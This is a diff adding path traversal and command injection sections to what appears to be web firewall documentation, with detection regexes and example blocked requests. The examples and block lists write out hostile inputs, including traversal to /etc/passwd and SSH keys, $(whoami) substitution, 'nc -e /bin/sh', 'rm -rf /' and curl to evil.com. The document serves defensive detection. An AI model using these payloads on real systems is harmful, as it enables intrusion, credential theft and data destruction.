@@ -7,6 +7,8 @@ This guide provides comprehensive documentation for all security rules implement
 - [Overview](#overview)
 - [SQL Injection Detection](#sql-injection-detection)
 - [Cross-Site Scripting (XSS) Prevention](#cross-site-scripting-xss-prevention)
+- [Path Traversal Detection](#path-traversal-detection)
+- [Command Injection Detection](#command-injection-detection)
 - [Rate Limiting](#rate-limiting)
 - [IP Filtering](#ip-filtering)
 - [Bot Detection](#bot-detection)
@@ -458,6 +460,311 @@ curl "http://localhost:6188/api/search?q=javascript+tutorial"
 
 - **Latency overhead**: ~0.15ms per request
 - **CPU usage**: Minimal
+- **Memory**: Constant
+
+## Path Traversal Detection
+
+Path traversal attacks (also known as directory traversal) attempt to access files outside the intended directory by manipulating file paths.
+
+### Configuration
+
+```yaml
+path_traversal:
+  enabled: true
+  block_mode: true
+```
+
+### Detection Patterns
+
+#### 1. Basic Directory Traversal
+
+```
+# Blocked patterns
+../../../etc/passwd
+..\..\..\..\windows\system32
+../../config/database.yml
+```
+
+**Regex Patterns:**
+```
+\.\.\/
+\.\.\\
+```
+
+#### 2. URL Encoded Traversal
+
+```
+# Blocked patterns
+%2e%2e%2f             # ../
+%2e%2e/               # ../
+%2e%2e%5c             # ..\
+..%2f..%2f            # ../../
+```
+
+**Regex Patterns:**
+```
+(?i)%2e%2e%2f
+(?i)%2e%2e/
+(?i)%2e%2e%5c
+```
+
+#### 3. Double Encoding
+
+```
+# Blocked patterns
+%252e%252e%252f       # Double-encoded ../
+%252e%252e/           # Double-encoded ../
+```
+
+**Regex Patterns:**
+```
+(?i)%252e%252e%252f
+```
+
+#### 4. Null Byte Injection
+
+```
+# Blocked patterns
+file.txt%00.jpg       # Null byte to bypass extension check
+../../../etc/passwd%00
+```
+
+**Regex Patterns:**
+```
+%00
+\\x00
+```
+
+#### 5. Sensitive File Access
+
+```
+# Blocked paths
+/etc/passwd
+/etc/shadow
+/.htaccess
+/.env
+/id_rsa
+/wp-config.php
+```
+
+### Examples
+
+#### Blocked Requests
+
+```bash
+# Basic traversal (blocked)
+curl "http://localhost:6188/api/file?path=../../../etc/passwd"
+# Response: 403 Forbidden
+
+# URL encoded traversal (blocked)
+curl "http://localhost:6188/api/file?path=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+# Response: 403 Forbidden
+
+# Sensitive file access (blocked)
+curl "http://localhost:6188/api/.htaccess"
+# Response: 403 Forbidden
+
+# Environment file (blocked)
+curl "http://localhost:6188/api/config/.env"
+# Response: 403 Forbidden
+
+# SSH key access (blocked)
+curl "http://localhost:6188/api/file?path=~/.ssh/id_rsa"
+# Response: 403 Forbidden
+
+# Windows path traversal (blocked)
+curl "http://localhost:6188/api/file?path=..\\..\\windows\\system32"
+# Response: 403 Forbidden
+```
+
+#### Allowed Requests
+
+```bash
+# Normal file access (allowed)
+curl "http://localhost:6188/api/file?path=documents/report.pdf"
+# Response: 200 OK
+
+# Normal path (allowed)
+curl "http://localhost:6188/api/users/123/profile"
+# Response: 200 OK
+```
+
+### Performance Impact
+
+- **Latency overhead**: ~0.2ms per request
+- **CPU usage**: Minimal (regex pre-compiled)
+- **Memory**: Constant
+
+## Command Injection Detection
+
+Command injection attacks attempt to execute arbitrary shell commands on the server by injecting malicious input.
+
+### Configuration
+
+```yaml
+command_injection:
+  enabled: true
+  block_mode: true
+```
+
+### Detection Patterns
+
+#### 1. Command Chaining Operators
+
+```
+# Blocked patterns
+; ls                  # Semicolon chaining
+| cat /etc/passwd     # Pipe
+&& whoami             # AND operator
+|| id                 # OR operator
+```
+
+**Regex Patterns:**
+```
+;\s*\w
+\|\s*\w
+\|\|\s*\w
+&&\s*\w
+```
+
+#### 2. Command Substitution
+
+```
+# Blocked patterns
+$(whoami)             # Dollar-paren substitution
+`id`                  # Backtick substitution
+${PATH}               # Variable expansion
+```
+
+**Regex Patterns:**
+```
+\$\(\s*\w
+`[^`]+`
+\$\{\s*\w
+```
+
+#### 3. Shell Redirections
+
+```
+# Blocked patterns
+> /tmp/file           # Output redirect
+>> /etc/passwd        # Append redirect
+< /etc/shadow         # Input redirect
+2>&1                  # Stderr redirect
+```
+
+**Regex Patterns:**
+```
+>\s*/
+>>\s*/
+<\s*/
+2>&1
+```
+
+#### 4. Dangerous Commands
+
+```
+# Blocked patterns
+curl http://evil.com
+wget http://malware.sh
+nc -e /bin/sh
+rm -rf /
+chmod 777 file
+sudo command
+ping -c 100
+```
+
+**Regex Patterns:**
+```
+(?i)\b(wget|curl)\s+
+(?i)\b(nc|netcat|ncat)\s+
+(?i)\b(rm|del|rmdir)\s+
+(?i)\bsudo\s+
+```
+
+#### 5. Shell Paths
+
+```
+# Blocked patterns
+/bin/bash
+/bin/sh
+/usr/bin/python
+cmd.exe
+powershell
+```
+
+**Regex Patterns:**
+```
+(?i)/bin/(sh|bash|zsh)
+(?i)cmd\.exe
+(?i)powershell
+```
+
+#### 6. URL Encoded Attacks
+
+```
+# Blocked patterns
+%3b                   # ; encoded
+%7c                   # | encoded
+%26                   # & encoded
+%60                   # ` encoded
+%24%28                # $( encoded
+```
+
+### Examples
+
+#### Blocked Requests
+
+```bash
+# Semicolon injection (blocked)
+curl "http://localhost:6188/api/exec?cmd=test;ls"
+# Response: 403 Forbidden
+
+# Pipe injection (blocked)
+curl "http://localhost:6188/api/exec?cmd=test%7ccat"
+# Response: 403 Forbidden
+
+# Command substitution (blocked)
+curl "http://localhost:6188/api/search?q=\$(whoami)"
+# Response: 403 Forbidden
+
+# Backtick substitution (blocked)
+curl "http://localhost:6188/api/search?q=\`id\`"
+# Response: 403 Forbidden
+
+# Shell path (blocked)
+curl "http://localhost:6188/api/exec?shell=/bin/bash"
+# Response: 403 Forbidden
+
+# Dangerous command (blocked)
+curl "http://localhost:6188/api/fetch?cmd=curl%20http://evil.com"
+# Response: 403 Forbidden
+
+# Environment variable (blocked)
+curl "http://localhost:6188/api/exec?path=\$PATH"
+# Response: 403 Forbidden
+
+# PowerShell (blocked)
+curl "http://localhost:6188/api/exec?cmd=powershell%20-c%20Get-Process"
+# Response: 403 Forbidden
+```
+
+#### Allowed Requests
+
+```bash
+# Normal query (allowed)
+curl "http://localhost:6188/api/search?q=hello+world"
+# Response: 200 OK
+
+# Normal API call (allowed)
+curl "http://localhost:6188/api/users/123"
+# Response: 200 OK
+```
+
+### Performance Impact
+
+- **Latency overhead**: ~0.2ms per request
+- **CPU usage**: Minimal (regex pre-compiled)
 - **Memory**: Constant
 
 ## Rate Limiting
